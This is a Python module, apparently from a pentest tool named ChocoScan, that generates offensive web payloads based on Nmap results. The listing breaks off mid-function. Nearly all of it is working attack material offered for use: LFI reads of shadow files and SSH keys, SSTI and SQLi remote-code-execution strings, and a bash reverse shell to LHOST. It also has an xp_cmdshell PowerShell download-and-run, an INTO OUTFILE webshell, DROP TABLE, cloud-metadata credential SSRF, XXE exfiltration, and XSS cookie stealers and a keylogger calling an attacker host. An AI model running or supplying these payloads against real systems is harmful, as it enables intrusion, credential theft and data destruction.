"""
ChocoScan — Web Payload Generator.

Génère des payloads offensifs adaptés au stack web détecté via Nmap :
  - LFI / Path Traversal (Linux + Windows, avec bypasses de filtres)
  - SSTI par moteur de templates (Jinja2, Twig, Smarty, Velocity, FreeMarker, ERB, Pebble)
  - SQLi par DBMS (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) + commandes sqlmap
  - SSRF (avec bypasses IP et endpoints cloud metadata)
  - XXE (file read, SSRF via XXE, OOB blind)
  - XSS (reflected, cookie stealer, bypass de filtres basiques)

La détection du stack se base sur le banner Nmap / nom de service.
Les payloads SSTI/SQLi s'adaptent automatiquement à la techno détectée.

Référence : book.hacktricks.xyz, portswigger.net/web-security
Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations

from dataclasses import dataclass, field
from urllib.parse import quote


# ── Modèles ───────────────────────────────────────────────────────────────────

@dataclass
class WebPayload:
    name:        str
    payload:     str
    url_encoded: str = ""
    description: str = ""
    notes:       str = ""


@dataclass
class SSTIEngine:
    name:        str
    tech:        list[str]   # Frameworks/langages associés
    detect:      str          # Payload de détection (doit retourner 49)
    rce_linux:   str          # RCE Linux
    rce_windows: str          # RCE Windows
    blind:       str          # Payload blind (DNS/HTTP callback)
    notes:       str = ""


@dataclass
class SQLiEntry:
    dbms:         str
    error_based:  str          # Extraction par erreur
    union_select: str          # Amorce UNION SELECT
    blind_time:   str          # Time-based blind
    stacked:      str = ""     # Stacked queries (si supporté)
    rce_cmd:      str = ""     # RCE directe si privs suffisants
    sqlmap_flags: str = ""     # Flags sqlmap spécifiques


@dataclass
class WebPayloadResult:
    host:          str
    port:          int
    protocol:      str           # "http" | "https"
    detected_tech: list[str]     # ["php", "flask", "apache", ...]
    os_hint:       str           # "linux" | "windows" | "unknown"
    lfi_payloads:  list[WebPayload]
    ssti_engines:  list[SSTIEngine]
    sqli_entries:  list[SQLiEntry]
    ssrf_payloads: list[WebPayload]
    xxe_payloads:  list[WebPayload]
    xss_payloads:  list[WebPayload]
    sqlmap_cmds:   list[str]
    notes:         list[str]


# ── Détection du stack ────────────────────────────────────────────────────────

_TECH_KEYWORDS: dict[str, list[str]] = {
    "php":        ["php", "laravel", "wordpress", "wp-", "joomla", "drupal",
                   "magento", "codeigniter", "symfony", "cakephp", "yii"],
    "python":     ["python", "flask", "django", "werkzeug", "tornado", "fastapi",
                   "gunicorn", "uvicorn", "bottle", "cherrypy"],
    "java":       ["java", "tomcat", "spring", "jetty", "jboss", "wildfly",
                   "glassfish", "jenkins", "struts", "jsr"],
    "ruby":       ["ruby", "rails", "sinatra", "rack", "passenger", "puma"],
    "nodejs":     ["node", "express", "nodejs", "koa", "nextjs", "nestjs"],
    "dotnet":     ["asp.net", ".net", "aspx", "iis", "microsoft-httpapi"],
    "apache":     ["apache", "httpd"],
    "nginx":      ["nginx"],
    "iis":        ["iis", "microsoft-iis"],
    "wordpress":  ["wordpress", "wp-login", "wp-content"],
    "windows":    ["windows", "microsoft", "iis", "rdp", "netbios", "mssql",
                   "win32", "win64"],
    "linux":      ["linux", "ubuntu", "debian", "centos", "fedora", "alpine",
                   "openssh", "apache", "nginx", "vsftpd"],
}


def _detect_tech(service_name: str, banner: str, product: str) -> tuple[list[str], str]:
    """Détecte la stack technologique depuis les informations Nmap."""
    combined = f"{service_name} {banner} {product}".lower()
    detected: list[str] = []
    for tech, keywords in _TECH_KEYWORDS.items():
        if any(kw in combined for kw in keywords):
            detected.append(tech)

    os_hint = "unknown"
    if "windows" in detected or any(k in combined for k in ["windows", "microsoft", "iis"]):
        os_hint = "windows"
    elif "linux" in detected or any(k in combined for k in ["linux", "apache", "nginx", "ubuntu"]):
        os_hint = "linux"

    return detected, os_hint


# ── LFI — Paths ──────────────────────────────────────────────────────────────

def _build_lfi_payloads(os_hint: str) -> list[WebPayload]:
    """Construit la liste des payloads LFI selon l'OS cible."""
    payloads: list[WebPayload] = []

    # ── Linux paths ───────────────────────────────────────────────────────────
    linux_paths = [
        ("/etc/passwd",              "Utilisateurs système — confirm LFI"),
        ("/etc/shadow",              "Hashes mots de passe — si root"),
        ("/etc/hosts",               "Réseau interne / hostnames"),
        ("/proc/self/environ",       "Variables d'environnement du process"),
        ("/proc/self/cmdline",       "Ligne de commande du process courant"),
        ("/proc/net/fib_trie",       "Sous-réseaux internes"),
        ("/proc/net/tcp",            "Connexions TCP actives (ports internes)"),
        ("/var/log/apache2/access.log", "Log poisoning Apache"),
        ("/var/log/nginx/access.log",   "Log poisoning Nginx"),
        ("/var/log/auth.log",           "Logs d'authentification SSH/PAM"),
        ("/root/.bash_history",         "Historique bash de root"),
        ("/root/.ssh/id_rsa",           "Clé privée SSH de root"),
        ("/home/USER/.bash_history",    "Historique d'un utilisateur"),
        ("/home/USER/.ssh/id_rsa",      "Clé SSH d'un utilisateur"),
        ("/etc/crontab",                "Tâches cron système"),
        ("/var/www/html/config.php",    "Config PHP (credentials BDD)"),
        ("/var/www/html/.env",          "Fichier .env Laravel/Django"),
        ("/etc/mysql/my.cnf",           "Config MySQL"),
        ("/etc/ssh/sshd_config",        "Config SSH"),
    ]

    # ── Windows paths ─────────────────────────────────────────────────────────
    windows_paths = [
        ("C:/Windows/System32/drivers/etc/hosts", "Hosts Windows"),
        ("C:/Windows/win.ini",                     "Fichier win.ini (confirm LFI)"),
        ("C:/Windows/System32/config/SAM",         "Base SAM (hashes — reboot requis)"),
        ("C:/inetpub/wwwroot/web.config",          "Config IIS (credentials)"),
        ("C:/xampp/apache/logs/access.log",        "Log Apache XAMPP — log poisoning"),
        ("C:/xampp/apache/logs/error.log",         "Log erreurs Apache"),
        ("C:/Users/Administrator/Desktop/root.txt","Flag CTF Admin"),
        ("C:/Users/USER/Desktop/user.txt",         "Flag CTF utilisateur"),
        ("C:/Windows/repair/SAM",                  "SAM de réparation"),
        ("C:/xampp/mysql/data/mysql/user.MYD",     "Users MySQL XAMPP"),
        ("C:/xampp/phpMyAdmin/config.inc.php",     "Config phpMyAdmin"),
        ("C:/ProgramData/MySQL/MySQL Server 5.6/my.ini", "Config MySQL Server"),
    ]

    # Choisir selon l'OS, ou tout inclure si inconnu
    active_paths = []
    if os_hint == "windows":
        active_paths = windows_paths
    elif os_hint == "linux":
        active_paths = linux_paths
    else:
        active_paths = linux_paths[:10] + windows_paths[:5]

    for path, desc in active_paths:
        # Traversal classique (profondeur 5)
        traversal = "../" * 5 + path.lstrip("/").lstrip("C:/")
        payloads.append(WebPayload(
            name=f"LFI {path}",
            payload=traversal,
            url_encoded=quote(traversal),
            description=desc,
            notes="",
        ))

    # ── Bypasses de filtres ───────────────────────────────────────────────────
    bypass_notes = [
        ("Double encoding",      "..%252f..%252f..%252fetc%252fpasswd"),
        ("Null byte (PHP <5.3)", "../../../../etc/passwd%00"),
        ("Filtre ../ strip",     "....//....//....//etc/passwd"),
        ("Filtre ../ strip 2",   "..././..././..././etc/passwd"),
        ("PHP wrappers",         "php://filter/convert.base64-encode/resource=/etc/passwd"),
        ("PHP input",            "php://input  (POST: <?php system($_GET['cmd']); ?>)"),
        ("PHP expect",           "expect://id"),
        ("Data URI",             "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"),
        ("Zip wrapper",          "zip:///path/to/file.zip#shell.php"),
    ]

    for name, payload in bypass_notes:
        payloads.append(WebPayload(
            name=f"Bypass: {name}",
            payload=payload,
            description="Bypass de filtre LFI",
        ))

    return payloads


# ── SSTI — Moteurs de templates ───────────────────────────────────────────────

ALL_SSTI_ENGINES: list[SSTIEngine] = [

    SSTIEngine(
        name="Jinja2",
        tech=["python", "flask", "django"],
        detect="{{7*7}}",
        rce_linux=(
            "{{request.environ.get('HTTP_X_FORWARDED_FOR','')}}\n"
            "# Ou via __class__ (si pas de sandbox) :\n"
            "{{''..__class__.__mro__[1].__subclasses__()[x].__init__"
            ".__globals__[\"popen\"](\"id\").read()}}\n"
            "# Remplacer x par l'index de subprocess.Popen (souvent ~258)\n"
            "# One-liner testé HTB :\n"
            "{{cycler.__init__.__globals__.os.popen('id').read()}}"
        ),
        rce_windows=(
            "{{cycler.__init__.__globals__.os.popen('whoami').read()}}"
        ),
        blind=(
            "{{cycler.__init__.__globals__.os.popen"
            "('curl http://LHOST/ssti?q=$(id|base64)').read()}}"
        ),
        notes="Test progressif : {{7*7}} → {{7*'7'}} → {{config}} → RCE",
    ),

    SSTIEngine(
        name="Twig",
        tech=["php", "symfony"],
        detect="{{7*7}}",
        rce_linux=(
            "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}"
            "{{_self.env.getFilter(\"id\")}}\n"
            "# Alternative :\n"
            "{{'/etc/passwd'|file_get_contents}}\n"
            "{{\"/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'\"|system}}"
        ),
        rce_windows=(
            "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}"
            "{{_self.env.getFilter(\"whoami\")}}"
        ),
        blind=(
            "{{_self.env.registerUndefinedFilterCallback(\"system\")}}"
            "{{_self.env.getFilter(\"curl http://LHOST/ssti\")}}"
        ),
        notes="Twig 1.x = {{7*7}} → 49 | Twig 2.x/3.x = {{7*'7'}} → error",
    ),

    SSTIEngine(
        name="Smarty",
        tech=["php"],
        detect="{$smarty.version}",
        rce_linux=(
            "{system('id')}\n"
            "# Alternative :\n"
            "{php}echo shell_exec('id');{/php}\n"
            "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"
            "\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}"
        ),
        rce_windows=(
            "{system('whoami')}"
        ),
        blind=(
            "{system('curl http://LHOST/ssti')}"
        ),
        notes="Smarty 3.x : {$var} | Smarty 4.x : sandbox renforcé",
    ),

    SSTIEngine(
        name="Velocity",
        tech=["java"],
        detect="#set($x=7*7)${x}",
        rce_linux=(
            "#set($rt = $class.forName('java.lang.Runtime'))\n"
            "#set($chr = $class.forName('java.lang.Character'))\n"
            "#set($str = $class.forName('java.lang.String'))\n"
            "#set($ex = $rt.getRuntime().exec('id'))\n"
            "$ex.waitFor()\n"
            "#set($out = $ex.getInputStream())\n"
            "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
        ),
        rce_windows=(
            "#set($ex = $class.forName('java.lang.Runtime').getRuntime().exec('whoami'))\n"
            "$ex.waitFor()"
        ),
        blind=(
            "#set($ex = $class.forName('java.lang.Runtime').getRuntime()"
            ".exec('curl http://LHOST/ssti'))\n$ex.waitFor()"
        ),
        notes="Fréquent sur applications Java EE / Apache (Struts, Confluence)",
    ),

    SSTIEngine(
        name="FreeMarker",
        tech=["java"],
        detect="${7*7}",
        rce_linux=(
            "<#assign ex = \"freemarker.template.utility.Execute\"?new()>"
            "${ex(\"id\")}\n"
            "# Alternative :\n"
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
        ),
        rce_windows=(
            "<#assign ex = \"freemarker.template.utility.Execute\"?new()>"
            "${ex(\"whoami\")}"
        ),
        blind=(
            "<#assign ex = \"freemarker.template.utility.Execute\"?new()>"
            "${ex(\"curl http://LHOST/ssti\")}"
        ),
        notes="Fréquent sur JBoss, Spring. Sandbox via Configuration#setNewBuiltinClassResolver",
    ),

    SSTIEngine(
        name="Pebble",
        tech=["java"],
        detect="{{7*7}}",
        rce_linux=(
            "{% set cmd = 'id' %}\n"
            "{%set bytes = \"\".class.forName(\"java.lang.Runtime\")"
            ".methods[6].invoke(\"\".class.forName(\"java.lang.Runtime\")"
            ".methods[7].invoke(null),cmd.split(\" \")).inputStream.readAllBytes()%}\n"
            "{{ bytes }}"
        ),
        rce_windows=(
            "{% set cmd = 'whoami' %}\n"
            "# Même payload que Linux"
        ),
        blind=("{% set x = \"\".class.forName(\"java.lang.Runtime\")"
               ".methods[6].invoke(\"\".class.forName(\"java.lang.Runtime\")"
               ".methods[7].invoke(null),'curl http://LHOST/ssti'.split(' ')).inputStream.readAllBytes()%}"),
        notes="Syntaxe proche de Jinja2 mais Java. Utilisé avec Spring Boot.",
    ),

    SSTIEngine(
        name="ERB (Ruby)",
        tech=["ruby"],
        detect="<%= 7*7 %>",
        rce_linux=("<%= `id` %>\n"
                   "# Alternative :\n"
                   "<%= system('id') %>\n"
                   "<%= IO.popen('id').read() %>"),
        rce_windows=("<%= `whoami` %>"),
        blind=("<%= system('curl http://LHOST/ssti') %>"),
        notes="Fréquent sur Ruby on Rails. erb -e + File.read pour LFI : <%= File.read('/etc/passwd') %>",
    ),
]


def _filter_ssti_by_tech(detected_tech: list[str]) -> list[SSTIEngine]:
    """Retourne les moteurs SSTI pertinents selon la stack détectée."""
    if not detected_tech:
        return ALL_SSTI_ENGINES

    relevant: list[SSTIEngine] = []
    for engine in ALL_SSTI_ENGINES:
        if any(t in detected_tech for t in engine.tech):
            relevant.append(engine)

    # Si rien de trouvé → retourner tous
    return relevant if relevant else ALL_SSTI_ENGINES


# ── SQLi — DBMS ──────────────────────────────────────────────────────────────

ALL_SQLI: list[SQLiEntry] = [

    SQLiEntry(
        dbms="MySQL / MariaDB",
        error_based=(
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) -- -\n"
            "' AND updatexml(1,concat(0x7e,(SELECT user())),1) -- -\n"
            "' OR (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x"
            " FROM information_schema.tables GROUP BY x)a) -- -"
        ),
        union_select=(
            "' ORDER BY 3 -- -                     # Déterminer le nombre de colonnes\n"
            "' UNION SELECT NULL,NULL,NULL -- -     # Confirmer les colonnes\n"
            "' UNION SELECT 1,version(),database() -- -\n"
            "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables"
            " WHERE table_schema=database() -- -\n"
            "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns"
            " WHERE table_name='users' -- -"
        ),
        blind_time=(
            "' AND SLEEP(5) -- -\n"
            "' AND IF(1=1,SLEEP(5),0) -- -\n"
            "' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0) -- -"
        ),
        stacked="'; DROP TABLE users -- -",  # Rarement autorisé
        rce_cmd=(
            "' UNION SELECT 1,'<?php system($_GET[\"cmd\"]);?>',3 INTO OUTFILE '/var/www/html/shell.php' -- -\n"
            "# Nécessite FILE privilege + chemin web writable"
        ),
        sqlmap_flags=(
            "--dbms=mysql --level=3 --risk=2 --dbs\n"
            "--dbms=mysql --tables -D DATABASE_NAME\n"
            "--dbms=mysql --dump -T users -D DATABASE_NAME"
        ),
    ),

    SQLiEntry(
        dbms="PostgreSQL",
        error_based=(
            "' AND 1=CAST((SELECT version()) AS INT) -- -\n"
            "' AND 1=(SELECT 1 FROM pg_sleep(0) WHERE 1=CAST((SELECT version()) AS INT))"
        ),
        union_select=(
            "' ORDER BY 3 -- -\n"
            "' UNION SELECT NULL,NULL,version()::text -- -\n"
            "' UNION SELECT 1,string_agg(tablename,','),3 FROM pg_tables WHERE schemaname='public' -- -\n"
            "' UNION SELECT 1,string_agg(column_name,','),3 FROM information_schema.columns"
            " WHERE table_name='users' -- -"
        ),
        blind_time=(
            "'; SELECT pg_sleep(5) -- -\n"
            "' AND (SELECT pg_sleep(5)) IS NOT NULL -- -"
        ),
        stacked=(
            "'; CREATE TABLE pwn(data text); -- -\n"
            "'; COPY (SELECT 'test') TO '/tmp/pwn.txt'; -- -"
        ),
        rce_cmd=(
            "# Si superuser :\n"
            "'; COPY cmd_exec FROM PROGRAM 'id'; -- -\n"
            "'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);"
            " COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; -- -"
        ),
        sqlmap_flags=(
            "--dbms=postgresql --level=3 --risk=2 --dbs\n"
            "--dbms=postgresql --os-shell   # Si superuser"
        ),
    ),

    SQLiEntry(
        dbms="Microsoft SQL Server",
        error_based=(
            "' AND 1=CONVERT(INT,@@version) -- -\n"
            "' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sysdatabases)) -- -"
        ),
        union_select=(
            "' ORDER BY 3 -- -\n"
            "' UNION SELECT NULL,NULL,@@version -- -\n"
            "' UNION SELECT 1,(SELECT STRING_AGG(name,',') FROM sysdatabases),3 -- -\n"
            "' UNION SELECT 1,(SELECT STRING_AGG(name,',') FROM sys.tables),3 -- -"
        ),
        blind_time=(
            "'; WAITFOR DELAY '0:0:5' -- -\n"
            "' AND 1=(SELECT 1 WHERE 1=1 AND (SELECT SLEEP_TIMER(5)) IS NOT NULL) -- -"
        ),
        stacked=(
            "'; SELECT 1 -- -"
        ),
        rce_cmd=(
            "# Si xp_cmdshell activé (ou si on peut l'activer) :\n"
            "'; EXEC xp_cmdshell('whoami') -- -\n"
            "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
            " EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; -- -\n"
            "'; EXEC xp_cmdshell('powershell -c \"IEX(New-Object Net.WebClient)"
            ".DownloadString(\\\"http://LHOST/shell.ps1\\\")\"') -- -"
        ),
        sqlmap_flags=(
            "--dbms=mssql --level=3 --risk=3\n"
            "--dbms=mssql --os-shell   # Via xp_cmdshell"
        ),
    ),

    SQLiEntry(
        dbms="Oracle",
        error_based=(
            "' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1)) -- -\n"
            "' AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) -- -"
        ),
        union_select=(
            "' ORDER BY 3 -- -\n"
            "' UNION SELECT NULL,NULL,banner FROM v$version WHERE ROWNUM=1 -- -\n"
            "' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE ROWNUM=1 -- -\n"
            "# Oracle : FROM DUAL obligatoire pour SELECT sans table :\n"
            "' UNION SELECT 1,2,3 FROM DUAL -- -"
        ),
        blind_time=(
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) -- -"
        ),
        sqlmap_flags=(
            "--dbms=oracle --level=3 --risk=2 --dbs"
        ),
    ),

    SQLiEntry(
        dbms="SQLite",
        error_based=(
            "' AND 1=CAST(sqlite_version() AS INTEGER) -- -"
        ),
        union_select=(
            "' ORDER BY 3 -- -\n"
            "' UNION SELECT NULL,sqlite_version(),NULL -- -\n"
            "' UNION SELECT 1,group_concat(tbl_name),3 FROM sqlite_master WHERE type='table' -- -\n"
            "' UNION SELECT 1,group_concat(sql),3 FROM sqlite_master WHERE tbl_name='users' -- -"
        ),
        blind_time=(
            "# SQLite ne supporte pas SLEEP — utiliser RANDOMBLOB :\n"
            "' AND 1=(SELECT COUNT(*) FROM sqlite_master WHERE 1=LIKE('ABCDEFG',"
            "UPPER(HEX(RANDOMBLOB(100000000/2))))) -- -"
        ),
        sqlmap_flags=(
            "--dbms=sqlite --level=3 --risk=2 --dbs"
        ),
    ),
]


def _filter_sqli_by_tech(detected_tech: list[str]) -> list[SQLiEntry]:
    """Retourne les entries SQLi pertinentes selon la stack."""
    tech_to_dbms = {
        "php":    ["MySQL / MariaDB", "SQLite"],
        "python": ["MySQL / MariaDB", "PostgreSQL", "SQLite"],
        "java":   ["MySQL / MariaDB", "Oracle", "Microsoft SQL Server"],
        "dotnet": ["Microsoft SQL Server"],
        "ruby":   ["MySQL / MariaDB", "PostgreSQL", "SQLite"],
        "nodejs": ["MySQL / MariaDB", "SQLite"],
    }

    relevant_dbms: set[str] = set()
    for tech in detected_tech:
        for dbms in tech_to_dbms.get(tech, []):
            relevant_dbms.add(dbms)

    if not relevant_dbms:
        return ALL_SQLI

    return [e for e in ALL_SQLI if e.dbms in relevant_dbms]


# ── SSRF — Payloads ───────────────────────────────────────────────────────────

def _build_ssrf_payloads(host: str, port: int) -> list[WebPayload]:
    """Construit les payloads SSRF avec bypasses d'IP et endpoints cloud."""
    url = f"http://{host}:{port}"
    payloads = [

        # ── Localhost bypasses ────────────────────────────────────────────────
        WebPayload("localhost classique",   "http://127.0.0.1/",
                   description="Accès localhost direct"),
        WebPayload("IPv6 localhost",        "http://[::1]/",
                   description="IPv6 loopback"),
        WebPayload("Hex IP",                "http://0x7f000001/",
                   description="127.0.0.1 en hexadécimal"),
        WebPayload("Octal IP",              "http://0177.0.0.1/",
                   description="127.0.0.1 en octal"),
        WebPayload("Decimal IP",            "http://2130706433/",
                   description="127.0.0.1 en décimal"),
        WebPayload("Short IP",              "http://127.1/",
                   description="Notation courte"),
        WebPayload("nip.io bypass",         "http://127.0.0.1.nip.io/",
                   description="DNS wildcard qui résout vers 127.0.0.1"),
        WebPayload("0.0.0.0",               "http://0.0.0.0/",
                   description="Équivalent 127.0.0.1 sur certains systèmes"),

        # ── Cloud metadata ────────────────────────────────────────────────────
        WebPayload("AWS IMDSv1",
                   "http://169.254.169.254/latest/meta-data/",
                   description="AWS metadata — IAM credentials, etc."),
        WebPayload("AWS IMDSv1 IAM",
                   "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                   description="AWS IAM temp credentials"),
        WebPayload("AWS IMDSv2 token",
                   "curl -X PUT 'http://169.254.169.254/latest/api/token' "
                   "-H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'",
                   description="AWS IMDSv2 — obtenir le token d'abord"),
        WebPayload("GCP metadata",
                   "http://metadata.google.internal/computeMetadata/v1/",
                   description="GCP metadata — header 'Metadata-Flavor: Google' requis"),
        WebPayload("Azure IMDS",
                   "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                   description="Azure metadata — header 'Metadata: true' requis"),

        # ── Interne cible ─────────────────────────────────────────────────────
        WebPayload("Scan port interne 8080",  f"http://127.0.0.1:8080/",
                   description="Souvent: Tomcat, dev server"),
        WebPayload("Scan port interne 8443",  "http://127.0.0.1:8443/",
                   description="Souvent: Tomcat HTTPS, Kubernetes API"),
        WebPayload("Scan port interne 9200",  "http://127.0.0.1:9200/",
                   description="Elasticsearch — souvent non filtré"),
        WebPayload("Scan port interne 6379",  "http://127.0.0.1:6379/",
                   description="Redis — parfois accessible en interne"),
        WebPayload("Scan port interne 5432",  "http://127.0.0.1:5432/",
                   description="PostgreSQL"),
        WebPayload("Scan gopher Redis",
                   "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
                   description="Gopher SSRF → Redis (config write, RCE)"),

        # ── Bypasses de filtres ───────────────────────────────────────────────
        WebPayload("URL encoding bypass",
                   "http://127%2E0%2E0%2E1/",
                   description="URL encode du point"),
        WebPayload("Double URL encode",
                   "http://127%252E0%252E0%252E1/",
                   description="Double encoding"),
        WebPayload("IPv6 encode",
                   "http://[0:0:0:0:0:ffff:127.0.0.1]/",
                   description="IPv4-mapped IPv6"),
    ]
    return payloads


# ── XXE — Payloads ────────────────────────────────────────────────────────────

def _build_xxe_payloads(lhost: str = "LHOST") -> list[WebPayload]:
    return [
        WebPayload(
            name="XXE — file:// Linux",
            payload=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
                '<foo>&xxe;</foo>'
            ),
            description="Lecture de fichier local via entité externe",
        ),
        WebPayload(
            name="XXE — file:// Windows",
            payload=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>\n'
                '<foo>&xxe;</foo>'
            ),
            description="Lecture fichier Windows",
        ),
        WebPayload(
            name="XXE — SSRF via HTTP",
            payload=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{lhost}/xxe-callback">]>\n'
                '<foo>&xxe;</foo>'
            ),
            description="SSRF via entité XXE (callback HTTP vers listener)",
        ),
        WebPayload(
            name="XXE — Blind OOB",
            payload=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{lhost}/xxe.dtd"> %xxe;]>\n'
                '<foo>test</foo>'
            ),
            description=(
                "Out-of-band blind XXE. Héberger xxe.dtd :\n"
                "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
                "<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://LHOST/?d=%file;'>\">\n"
                "%eval; %exfil;"
            ),
        ),
        WebPayload(
            name="XXE — DOCTYPE via paramètre",
            payload=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE foo [\n'
                '  <!ENTITY % xxe SYSTEM "file:///etc/passwd">\n'
                '  <!ENTITY % wrapper "<!ENTITY send SYSTEM \'http://LHOST/?d=%xxe;\'>">\n'
                '  %wrapper;\n'
                ']>\n'
                '<foo>&send;</foo>'
            ),
            description="Exfiltration en deux étapes via entités paramètre",
        ),
    ]


# ── XSS — Payloads ───────────────────────────────────────────────────────────

def _build_xss_payloads(lhost: str = "LHOST") -> list[WebPayload]:
    payloads = [
        WebPayload("XSS basique",             "<script>alert(1)</script>"),
        WebPayload("XSS img onerror",         "<img src=x onerror=alert(1)>"),
        WebPayload("XSS SVG",                 "<svg onload=alert(1)>"),
        WebPayload("XSS body",                "<body onload=alert(1)>"),
        WebPayload("XSS href javascript",     "javascript:alert(1)"),
        WebPayload("XSS bypass casse",        "<ScRiPt>alert(1)</ScRiPt>"),
        WebPayload("XSS bypass tags",         "<img/src=x onerror=alert(1)>"),
        WebPayload("XSS without parentheses", "<img src=x onerror=alert`1`>"),
        WebPayload("XSS HTML entity bypass",  "&lt;script&gt;alert(1)&lt;/script&gt;"),
        WebPayload("XSS double encode",       "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
                   description="URL-encoded"),
        WebPayload(
            "XSS cookie stealer",
            f"<script>document.location='http://{lhost}/?c='+document.cookie</script>",
            description=f"Exfil cookies vers http://{lhost} — listener: nc -lvnp 80",
        ),
        WebPayload(
            "XSS fetch stealer",
            f"<script>fetch('http://{lhost}/?c='+btoa(document.cookie))</script>",
            description="Exfil cookies encodés en base64",
        ),
        WebPayload(
            "XSS keylogger",
            f"<script>document.onkeypress=function(e){{fetch('http://{lhost}/?k='+e.key)}}</script>",
            description="Keylogger via XSS",
        ),
        WebPayload("XSS DOM clobber",         "<img name=cookie>",
                   description="DOM clobbering — cible document.cookie"),
        WebPayload("XSS CSP bypass nonce",
                   "<script nonce=NONCE>alert(1)</script>",
                   description="Si nonce CSP récupérable"),
    ]
    return payloads


# ── Commandes sqlmap ──────────────────────────────────────────────────────────

def _build_sqlmap_cmds(host: str, port: int, protocol: str,
                       detected_tech: list[str]) -> list[str]:
    """Génère des commandes sqlmap adaptées au contexte."""
    base_url = f"{protocol}://{host}:{port}"
    cmds = [
        f"# ── sqlmap — {host}:{port} ─────────────────────────────────────",
        "",
        "# 1. Détection basique (GET parameter)",
        f"sqlmap -u \"{base_url}/page?id=1\" --dbs --batch",
        "",
        "# 2. Avec authentification (cookie de session)",
        f"sqlmap -u \"{base_url}/page?id=1\" --cookie=\"PHPSESSID=xxx\" --dbs --batch",
        "",
        "# 3. Formulaire POST",
        f"sqlmap -u \"{base_url}/login\" --data=\"username=admin&password=test\" "
        "--dbs --batch",
        "",
        "# 4. Fuzzing complet (plus lent)",
        f"sqlmap -u \"{base_url}/\" --crawl=3 --forms --dbs --level=3 --risk=2 --batch",
        "",
        "# 5. Dump d'une table",
        f"sqlmap -u \"{base_url}/page?id=1\" -D DATABASE --tables --batch",
        f"sqlmap -u \"{base_url}/page?id=1\" -D DATABASE -T TABLENAME --dump --batch",
        "",
        "# 6. Bypass WAF",
        f"sqlmap -u \"{base_url}/page?id=1\" --tamper=space2comment,between,randomcase --dbs",
        "",
        "# 7. OS shell (si FILE privilege MySQL ou xp_cmdshell MSSQL)",
        f"sqlmap -u \"{base_url}/page?id=1\" --os-shell --batch",
    ]

    # Ajout flags DBMS-spécifiques si détectés
    if "dotnet" in detected_tech:
        cmds += ["",
                 "# MSSQL spécifique :",
                 f"sqlmap -u \"{base_url}/page?id=1\" --dbms=mssql --os-shell --batch"]
    if "python" in detected_tech:
        cmds += ["",
                 "# Python — souvent PostgreSQL :",
                 f"sqlmap -u \"{base_url}/page?id=1\" --dbms=postgresql --dbs --batch"]

    return cmds


# ── Moteur principal ──────────────────────────────────────────────────────────

def analyze_web_payloads(
    services: list,
    lhost: str = "LHOST",
    lport: int = 4444,
) -> list[WebPayloadResult]:
    """
    Analyse une liste de services Nmap et génère des payloads web offensifs
    pour chaque service HTTP/HTTPS détecté.

    Args:
        services: Liste de NmapService (ou dicts avec les mêmes attrs).
        lhost:    IP de l'attaquant (pour SSRF callbacks, XSS stealers).
        lport:    Port d'écoute de l'attaquant.

    Returns:
        Liste de WebPayloadResult, un par service HTTP/HTTPS détecté.
    """
    results: list[WebPayloadResult] = []

    for svc in services:
        svc_name = getattr(svc, "service_name", "") or ""
        port     = getattr(svc, "port", 80) or 80
        host     = getattr(svc, "host", "TARGET") or "TARGET"
        banner   = getattr(svc, "banner", "") or ""
        product  = getattr(svc, "product", "") or ""
        version  = getattr(svc, "version", "") or ""

        # Filtre : service web uniquement
        is_web = (
            "http" in svc_name.lower()
            or port in (80, 443, 8080, 8443, 8000, 8001, 8888, 3000, 5000)
            or "web" in svc_name.lower()
            or "ssl" in svc_name.lower()
        )
        if not is_web:
            continue

        protocol = "https" if (port in (443, 8443) or "ssl" in svc_name.lower()) else "http"
        detected_tech, os_hint = _detect_tech(svc_name, banner, product)

        notes: list[str] = []
        if not detected_tech:
            notes.append("Stack non identifiée — payloads génériques inclus.")
        else:
            notes.append(f"Stack détectée : {', '.join(detected_tech)}")

        results.append(WebPayloadResult(
            host=host,
            port=port,
            protocol=protocol,
            detected_tech=detected_tech,
            os_hint=os_hint,
